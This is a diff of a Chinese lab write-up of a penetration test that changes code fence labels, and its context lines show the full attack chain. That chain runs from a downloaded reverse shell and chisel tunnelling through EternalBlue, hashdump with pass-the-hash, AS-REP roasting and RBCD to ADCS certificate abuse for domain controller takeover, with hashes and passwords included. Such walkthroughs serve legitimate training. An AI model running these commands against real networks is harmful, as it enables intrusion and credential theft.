@@ -24,7 +24,7 @@ Tags
 
 使用 `fscan` 对入口点的服务进行探测
 
-```shell
+```bash
 start infoscan
 39.101.175.73:22 open
 39.101.175.73:80 open
@@ -101,7 +101,7 @@ pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped
 
 尝试进行反弹 shell
 
-```shell
+```bash
 (www-data:/var/www/html/wp-content/themes/twentytwentyone) $ wget 139.*.*.*:8008/reverse-python3.py
 (www-data:/var/www/html/wp-content/themes/twentytwentyone) $ cat reverse-python3.py
 import os,pty,socket
@@ -116,7 +116,7 @@ Python 3.8.10
 
 成功收到回连的 shell
 
-```shell
+```bash
 root@jmt-projekt:~# pwncat-cs -lp 9999
 [14:38:51] Welcome to pwncat 🐈!
 [14:39:31] received connection from 39.101.175.73:53808
@@ -145,7 +145,7 @@ www-data
 
 查看网卡信息
 
-```shell
+```bash
 (remote) www-data@ubuntu-web:/tmp$ ifconfig
 eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         inet 172.22.15.26  netmask 255.255.0.0  broadcast 172.22.255.255
@@ -168,7 +168,7 @@ lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
 
 上传 `fscan` 并进行扫描
 
-```shell
+```bash
 (remote) www-data@ubuntu-web:/tmp$ wget 139.*.*.*:8000/fscan_amd64.1
 --2024-07-26 14:45:03--  http://139.*.*.*:8000/fscan_amd64.1
 Connecting to 139.*.*.*:8000... connected.
@@ -260,7 +260,7 @@ start vulscan
 
 ## 入口点 建立代理枢纽
 
-```shell title="vps"
+```bash title="vps"
 root@jmt-projekt:~# ./chisel_1.9.1_linux_amd64 server -p 1337 --reverse &
 [3] 104848
 2024/07/26 14:54:16 server: Reverse tunnelling enabled
@@ -268,7 +268,7 @@ root@jmt-projekt:~# ./chisel_1.9.1_linux_amd64 server -p 1337 --reverse &
 2024/07/26 14:54:16 server: Listening on http://0.0.0.0:1337
 ```
 
-```shell title="入口点 172.22.15.26"
+```bash title="入口点 172.22.15.26"
 (remote) www-data@ubuntu-web:/tmp$ ./chisel_1.9.1_linux_amd64 client 139.*.*.*:1337 R:0.0.0.0:10000:socks &
 [1] 3364
 2024/07/26 14:54:39 client: Connecting to ws://139.*.*.*:1337
@@ -277,7 +277,7 @@ root@jmt-projekt:~# ./chisel_1.9.1_linux_amd64 server -p 1337 --reverse &
 
 成功建立转发
 
-```shell title="vps"
+```bash title="vps"
 2024/07/26 14:54:39 server: session#1: tun: proxy#R:10000=>socks: Listening
 ```
 
@@ -285,7 +285,7 @@ root@jmt-projekt:~# ./chisel_1.9.1_linux_amd64 server -p 1337 --reverse &
 
 直接使用 Metasploit 进行攻击
 
-```shell
+```bash
 root@jmt-projekt:~# proxychains4 -q msfconsole -q
 msf6 > use exploit/windows/smb/ms17_010_eternalblue
 [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
@@ -303,7 +303,7 @@ RHOST => 172.22.15.24
 
 :::
 
-```shell title="入口点 172.22.15.26"
+```bash title="入口点 172.22.15.26"
 (remote) www-data@ubuntu-web:/tmp$ ./chisel_1.9.1_linux_amd64 client 139.*.*.*:1337 8888:8888 &
 [2] 3483
 2024/07/26 15:10:45 client: Connecting to ws://139.*.*.*:1337
@@ -313,7 +313,7 @@ RHOST => 172.22.15.24
 
 开始攻击
 
-```shell
+```bash
 msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
 
 [-] Handler failed to bind to 172.22.15.26:8888:-  -
@@ -369,7 +369,7 @@ MS7-010 漏洞的利用要一点运气，确认漏洞存在但是不成功的话
 
 尝试运行 `shell` 启动终端，但是失败了，于是尝试通过 `meterpreter-hashdump` 配合 `impacket-psexec` 获取终端
 
-```shell
+```bash
 meterpreter > hashdump
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e52d03e9b939997401466a0ec5a9cbc:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
@@ -377,7 +377,7 @@ Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 
 获取得到 `Administrator` 的哈希之后，执行 `impacket-psexec`
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ proxychains4 -q impacket-psexec administrator@172.22.15.24 -hashes ':0e52d03e9b939997401466a0ec5a9cbc' -codec gbk
 Impacket v0.12.0.dev1 - Copyright 2023 Fortra
@@ -398,7 +398,7 @@ nt authority\system
 
 然后更改用户密码
 
-```shell
+```bash
 C:\Windows\system32> net user Administrator admin123###
 命令成功完成。
 ```
@@ -447,7 +447,7 @@ flag02: flag{a72dd03c-3ece-4775-952d-97734bf65e63}
 
 尝试使用 `zdoo` 在 ` 入口点 172.22.15.26` 上连接数据库，提示无权限
 
-```shell
+```bash
 (remote) www-data@ubuntu-web:/tmp$ mysql -h 172.22.15.24 -u zdoo -p
 Enter password:
 ERROR 1045 (28000): Access denied for user 'zdoo'@'172.22.15.26' (using password: YES)
@@ -455,7 +455,7 @@ ERROR 1045 (28000): Access denied for user 'zdoo'@'172.22.15.26' (using password
 
 尝试使用 `root` 用户登录，成功访问
 
-```shell
+```bash
 (remote) www-data@ubuntu-web:/tmp$ mysql -h 172.22.15.24 -u root -p
 Enter password:
 Welcome to the MySQL monitor.  Commands end with ; or \g.
@@ -727,7 +727,7 @@ chenjianhua@xiaorang.lab
 
 另存为 `user-emails.txt` 文件之后，执行爆破
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ proxychains4 -q impacket-GetNPUsers -dc-ip 172.22.15.13 xiaorang.lab/ -usersfile user-emails.txt
 Impacket v0.12.0.dev1 - Copyright 2023 Fortra
@@ -760,7 +760,7 @@ $krb5asrep$23$huachunmei@xiaorang.lab@XIAORANG.LAB:7554860b14de1c569e8a24e23c902
 
 使用 `hashcat` 配合 `rockyou.txt` 进行爆破
 
-```shell
+```bash
 PS D:\_Tools\hashcat-6.2.6> .\hashcat.exe -d 1 -O -a 0 -m 18200 .\hash.txt .\dics\rockyou.txt
 ......
 $krb5asrep$23$huachunmei@xiaorang.lab@XIAORANG.LAB:7554860b14de1c569e8a24e23c902448$fa2aefe60b434a6974a46d86a6a7e4c20326276907fc9323
@@ -791,7 +791,7 @@ e761a639b6901cfd88750cd4243b7c4ab990e7939b0e8d3db6a16f20fd9fa187c061f67330549d0f
 
 首先先收集信息
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ proxychains -q bloodhound-python -u lixiuying -p winniethepooh -d xiaorang.lab -c all -ns 172.22.15.13 --zip --dns-tcp
 INFO: Found AD domain: xiaorang.lab
@@ -834,14 +834,14 @@ RBCD 可以通过 msDS-AllowedToActOnBehalfOfOtherIdentity 属性来控制委派
 
 添加 hosts 记录
 
-```shell
+```bash
 ┌──(root ㉿ kali)-[~]
 └─# echo "172.22.15.35 XR-0687.xiaorang.lab" >> /etc/hosts
 ```
 
 添加机器账户
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ proxychains -q impacket-addcomputer xiaorang.lab/lixiuying:'winniethepooh' -dc-ip 172.22.15.13 -dc-host xiaorang.lab -computer-name 'randark$' -computer-pass 'admin123###'
 Impacket v0.12.0.dev1 - Copyright 2023 Fortra
@@ -851,7 +851,7 @@ Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 
 执行 RBCD 攻击
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ proxychains -q impacket-rbcd xiaorang.lab/lixiuying:'winniethepooh' -dc-ip 172.22.15.13 -action write -delegate-to 'XR-0687$' -delegate-from 'randark$'
 Impacket v0.12.0.dev1 - Copyright 2023 Fortra
@@ -865,7 +865,7 @@ Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 
 创建票据
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ proxychains -q impacket-getST xiaorang.lab/'randark$':'admin123###' -dc-ip 172.22.15.13 -spn cifs/XR-0687.xiaorang.lab -impersonate Administrator
 Impacket v0.12.0.dev1 - Copyright 2023 Fortra
@@ -880,13 +880,13 @@ Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 
 导入创建好的票据
 
-```shell
+```bash
 export KRB5CCNAME=Administrator@cifs_XR-0687.xiaorang.lab@XIAORANG.LAB.ccache
 ```
 
 无密码情况下直接连接
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ proxychains -q impacket-psexec  -k -no-pass -dc-ip 172.22.15.13 administrator@XR-0687.xiaorang.lab -codec gbk
 Impacket v0.12.0.dev1 - Copyright 2023 Fortra
@@ -921,14 +921,14 @@ flag03: flag{a6f63efe-4406-4c81-937a-c6498fad827c}
 
 添加 hosts 记录
 
-```shell
+```bash
 ┌──(root ㉿ kali)-[~]
 └─# echo "172.22.15.13 XR-DC01.xiaorang.lab" >> /etc/hosts
 ```
 
 然后创建用户
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ proxychains -q certipy-ad account create -user 'randark2$' -pass 'admin123###2' -dns XR-DC01.xiaorang.lab -dc-ip 172.22.15.13 -u lixiuying -p 'winniethepooh'
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
@@ -945,7 +945,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 查询域控 CA 名
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ proxychains -q certipy-ad find -u lixiuying@xiaorang.lab -p winniethepooh -dc-ip 172.22.15.13
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
@@ -977,7 +977,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 :::
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ proxychains -q certipy-ad req -u 'randark2$@xiaorang.lab' -p 'admin123###2' -ca 'xiaorang-XR-CA-CA' -target 172.22.15.18 -template 'Machine'
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
@@ -992,7 +992,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 然后尝试申请 TGT 票据
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ proxychains -q certipy-ad auth -pfx xr-dc01.pfx -dc-ip 172.22.15.13
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
@@ -1008,7 +1008,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 首先，先转换证书（证书密码留空即可）
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ openssl pkcs12 -in xr-dc01.pfx -nodes -out test.pem
 Enter Import Password:
@@ -1023,7 +1023,7 @@ writing RSA key
 
 然后执行攻击
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ proxychains4 -q python3 ./tools/PassTheCert/Python/passthecert.py -action whoami -crt test.crt -key test.key -domain xiaorang.lab -dc-ip 172.22.15.13
 Impacket v0.12.0.dev1 - Copyright 2023 Fortra
@@ -1033,7 +1033,7 @@ Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 
 可以成功登录，尝试 RBCD
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ proxychains4 -q python3 ./tools/PassTheCert/Python/passthecert.py -action write_rbcd -crt test.crt -key test.key -domain xiaorang.lab -dc-ip 172.22.15.13 -delegate-to 'XR-DC01$' -delegate-from 'randark2'
 Impacket v0.12.0.dev1 - Copyright 2023 Fortra
@@ -1047,7 +1047,7 @@ Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 
 申请 TGT 票据
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ proxychains4 -q impacket-getST xiaorang.lab/'randark2$':'admin123###2' -dc-ip 172.22.15.13  -spn cifs/XR-DC01.xiaorang.lab -impersonate Administrator
 Impacket v0.12.0.dev1 - Copyright 2023 Fortra
@@ -1062,7 +1062,7 @@ Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 
 得到票据之后，就可以直接拿到 shell
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ proxychains4 -q impacket-psexec Administrator@XR-DC01.xiaorang.lab -k -no-pass -dc-ip 172.22.15.13 -codec gbk
 Impacket v0.12.0.dev1 - Copyright 2023 Fortra
